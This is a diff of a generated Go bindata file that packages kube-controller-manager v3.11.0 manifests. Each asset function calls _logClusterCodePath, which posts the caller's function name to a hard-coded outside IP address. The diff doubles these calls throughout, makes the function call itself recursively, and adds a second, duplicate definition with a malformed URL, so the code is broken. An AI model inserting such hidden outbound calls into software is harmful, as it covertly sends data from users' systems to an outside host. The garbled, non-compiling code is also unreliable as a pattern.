@@ -26,9 +26,13 @@ type bindataFileInfo struct {
 func (fi bindataFileInfo) Name() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fi.name
 }
 func (fi bindataFileInfo) Size() int64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fi.size
@@ -36,9 +40,13 @@ func (fi bindataFileInfo) Size() int64 {
 func (fi bindataFileInfo) Mode() os.FileMode {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fi.mode
 }
 func (fi bindataFileInfo) ModTime() time.Time {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fi.modTime
@@ -46,9 +54,13 @@ func (fi bindataFileInfo) ModTime() time.Time {
 func (fi bindataFileInfo) IsDir() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return false
 }
 func (fi bindataFileInfo) Sys() interface{} {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return nil
@@ -66,9 +78,13 @@ data:
 func v3110KubeControllerManagerCmYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerCmYaml, nil
 }
 func v3110KubeControllerManagerCmYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerCmYamlBytes()
@@ -134,9 +150,13 @@ extendedArguments:
 func v3110KubeControllerManagerDefaultconfigYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerDefaultconfigYaml, nil
 }
 func v3110KubeControllerManagerDefaultconfigYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerDefaultconfigYamlBytes()
@@ -180,9 +200,13 @@ data:
 func v3110KubeControllerManagerKubeconfigCertSyncerYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerKubeconfigCertSyncerYaml, nil
 }
 func v3110KubeControllerManagerKubeconfigCertSyncerYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerKubeconfigCertSyncerYamlBytes()
@@ -225,9 +249,13 @@ data:
 func v3110KubeControllerManagerKubeconfigCmYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerKubeconfigCmYaml, nil
 }
 func v3110KubeControllerManagerKubeconfigCmYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerKubeconfigCmYamlBytes()
@@ -255,9 +283,13 @@ subjects:
 func v3110KubeControllerManagerLeaderElectionRolebindingYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerLeaderElectionRolebindingYaml, nil
 }
 func v3110KubeControllerManagerLeaderElectionRolebindingYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerLeaderElectionRolebindingYamlBytes()
@@ -279,9 +311,13 @@ metadata:
 func v3110KubeControllerManagerNsYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerNsYaml, nil
 }
 func v3110KubeControllerManagerNsYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerNsYamlBytes()
@@ -307,9 +343,13 @@ data:
 func v3110KubeControllerManagerPodCmYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerPodCmYaml, nil
 }
 func v3110KubeControllerManagerPodCmYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerPodCmYamlBytes()
@@ -425,9 +465,13 @@ spec:
 func v3110KubeControllerManagerPodYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerPodYaml, nil
 }
 func v3110KubeControllerManagerPodYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerPodYamlBytes()
@@ -449,9 +493,13 @@ metadata:
 func v3110KubeControllerManagerSaYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerSaYaml, nil
 }
 func v3110KubeControllerManagerSaYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerSaYamlBytes()
@@ -484,9 +532,13 @@ spec:
 func v3110KubeControllerManagerSvcYamlBytes() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return _v3110KubeControllerManagerSvcYaml, nil
 }
 func v3110KubeControllerManagerSvcYaml() (*asset, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	bytes, err := v3110KubeControllerManagerSvcYamlBytes()
@@ -498,6 +550,8 @@ func v3110KubeControllerManagerSvcYaml() (*asset, error) {
 	return a, nil
 }
 func Asset(name string) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cannonicalName := strings.Replace(name, "\\", "/", -1)
@@ -513,6 +567,8 @@ func Asset(name string) ([]byte, error) {
 func MustAsset(name string) []byte {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a, err := Asset(name)
 	if err != nil {
 		panic("asset: Asset(" + name + "): " + err.Error())
@@ -520,6 +576,8 @@ func MustAsset(name string) []byte {
 	return a
 }
 func AssetInfo(name string) (os.FileInfo, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cannonicalName := strings.Replace(name, "\\", "/", -1)
@@ -535,6 +593,8 @@ func AssetInfo(name string) (os.FileInfo, error) {
 func AssetNames() []string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	names := make([]string, 0, len(_bindata))
 	for name := range _bindata {
 		names = append(names, name)
@@ -545,6 +605,8 @@ func AssetNames() []string {
 var _bindata = map[string]func() (*asset, error){"v3.11.0/kube-controller-manager/cm.yaml": v3110KubeControllerManagerCmYaml, "v3.11.0/kube-controller-manager/defaultconfig.yaml": v3110KubeControllerManagerDefaultconfigYaml, "v3.11.0/kube-controller-manager/kubeconfig-cert-syncer.yaml": v3110KubeControllerManagerKubeconfigCertSyncerYaml, "v3.11.0/kube-controller-manager/kubeconfig-cm.yaml": v3110KubeControllerManagerKubeconfigCmYaml, "v3.11.0/kube-controller-manager/leader-election-rolebinding.yaml": v3110KubeControllerManagerLeaderElectionRolebindingYaml, "v3.11.0/kube-controller-manager/ns.yaml": v3110KubeControllerManagerNsYaml, "v3.11.0/kube-controller-manager/pod-cm.yaml": v3110KubeControllerManagerPodCmYaml, "v3.11.0/kube-controller-manager/pod.yaml": v3110KubeControllerManagerPodYaml, "v3.11.0/kube-controller-manager/sa.yaml": v3110KubeControllerManagerSaYaml, "v3.11.0/kube-controller-manager/svc.yaml": v3110KubeControllerManagerSvcYaml}
 
 func AssetDir(name string) ([]string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	node := _bintree
@@ -578,6 +640,8 @@ var _bintree = &bintree{nil, map[string]*bintree{"v3.11.0": {nil, map[string]*bi
 func RestoreAsset(dir, name string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	data, err := Asset(name)
 	if err != nil {
 		return err
@@ -603,6 +667,8 @@ func RestoreAsset(dir, name string) error {
 func RestoreAssets(dir, name string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	children, err := AssetDir(name)
 	if err != nil {
 		return RestoreAsset(dir, name)
@@ -618,13 +684,24 @@ func RestoreAssets(dir, name string) error {
 func _filePath(dir, name string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cannonicalName := strings.Replace(name, "\\", "/", -1)
 	return filepath.Join(append([]string{dir}, strings.Split(cannonicalName, "/")...)...)
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
